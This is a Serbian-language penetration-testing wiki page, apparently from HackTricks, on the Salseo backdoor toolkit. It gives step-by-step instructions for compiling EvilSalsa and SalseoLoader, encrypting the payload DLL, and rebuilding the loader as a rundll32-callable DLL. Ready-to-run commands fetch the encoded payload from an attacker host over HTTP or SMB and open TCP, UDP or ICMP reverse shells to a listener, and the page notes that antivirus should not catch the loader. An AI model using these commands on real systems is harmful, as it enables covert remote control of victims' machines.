# Salseo

{{#include ../banners/hacktricks-training.md}}

## Kompajliranje binarnih fajlova

Preuzmite izvorni kod sa github-a i kompajlirajte **EvilSalsa** i **SalseoLoader**. Biće vam potreban **Visual Studio** instaliran da biste kompajlirali kod.

Kompajlirajte te projekte za arhitekturu Windows mašine na kojoj ćete ih koristiti (Ako Windows podržava x64, kompajlirajte ih za tu arhitekturu).

Možete **izabrati arhitekturu** unutar Visual Studio-a u **levom "Build" tabu** u **"Platform Target".**

(**Ako ne možete pronaći ove opcije, pritisnite na **"Project Tab"** a zatim na **"\<Project Name> Properties"**)

![](<../images/image (132).png>)

Zatim, izgradite oba projekta (Build -> Build Solution) (Unutar logova će se pojaviti putanja do izvršnog fajla):

![](<../images/image (1) (2) (1) (1) (1).png>)

## Pripremite Backdoor

Prvo, biće potrebno da kodirate **EvilSalsa.dll.** Da biste to uradili, možete koristiti python skriptu **encrypterassembly.py** ili možete kompajlirati projekat **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
U redu, sada imate sve što vam je potrebno da izvršite sve Salseo stvari: **encoded EvilDalsa.dll** i **binary of SalseoLoader.**

**Otpremite SalseoLoader.exe binarni fajl na mašinu. Ne bi trebalo da budu otkriveni od strane bilo kog AV...**

## **Izvršavanje backdoora**

### **Dobijanje TCP reverzibilne ljuske (preuzimanje kodiranog dll-a putem HTTP-a)**

Zapamtite da pokrenete nc kao slušača reverzibilne ljuske i HTTP server da poslužite kodirani evilsalsa.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Dobijanje UDP reverzibilne ljuske (preuzimanje kodirane dll preko SMB)**

Zapamtite da pokrenete nc kao slušač reverzibilne ljuske, i SMB server da posluži kodirani evilsalsa (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Dobijanje ICMP reverzibilne ljuske (kodirana dll već unutar žrtve)**

**Ovoga puta vam je potreban poseban alat na klijentu da primite reverzibilnu ljusku. Preuzmite:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Onemogućite ICMP odgovore:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Izvrši klijenta:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Unutar žrtve, hajde da izvršimo salseo stvar:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Kompajliranje SalseoLoader-a kao DLL koji izvozi glavnu funkciju

Otvorite SalseoLoader projekat koristeći Visual Studio.

### Dodajte pre glavne funkcije: \[DllExport]

![](<../images/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Instalirajte DllExport za ovaj projekat

#### **Alati** --> **NuGet Package Manager** --> **Upravljanje NuGet paketima za rešenje...**

![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Pretražite DllExport paket (koristeći Browse tab), i pritisnite Instaliraj (i prihvatite iskačući prozor)**

![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

U vašem projektnom folderu pojavili su se fajlovi: **DllExport.bat** i **DllExport_Configure.bat**

### **De**instalirajte DllExport

Pritisnite **Deinstaliraj** (da, čudno je, ali verujte mi, to je neophodno)

![](<../images/image (5) (1) (1) (2) (1).png>)

### **Izađite iz Visual Studija i izvršite DllExport_configure**

Jednostavno **izađite** iz Visual Studija

Zatim, idite u vaš **SalseoLoader folder** i **izvršite DllExport_Configure.bat**

Izaberite **x64** (ako planirate da ga koristite unutar x64 okruženja, to je bio moj slučaj), izaberite **System.Runtime.InteropServices** (unutar **Namespace for DllExport**) i pritisnite **Primeni**

![](<../images/image (7) (1) (1) (1) (1).png>)

### **Ponovo otvorite projekat sa Visual Studio**

**\[DllExport]** više ne bi trebao biti označen kao greška

![](<../images/image (8) (1).png>)

### Izgradite rešenje

Izaberite **Tip izlaza = Class Library** (Projekat --> SalseoLoader Svojstva --> Aplikacija --> Tip izlaza = Class Library)

![](<../images/image (10) (1).png>)

Izaberite **x64** **platformu** (Projekat --> SalseoLoader Svojstva --> Izgradnja --> Ciljna platforma = x64)

![](<../images/image (9) (1) (1).png>)

Da **izgradite** rešenje: Izgradnja --> Izgradi rešenje (Unutar izlazne konzole će se pojaviti putanja novog DLL-a)

### Testirajte generisani Dll

Kopirajte i nalepite Dll gde želite da ga testirate.

Izvršite:
```
rundll32.exe SalseoLoader.dll,main
```
Ako se ne pojavi greška, verovatno imate funkcionalan DLL!!

## Dobijanje shel-a koristeći DLL

Ne zaboravite da koristite **HTTP** **server** i postavite **nc** **listener**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{{#include ../banners/hacktricks-training.md}}
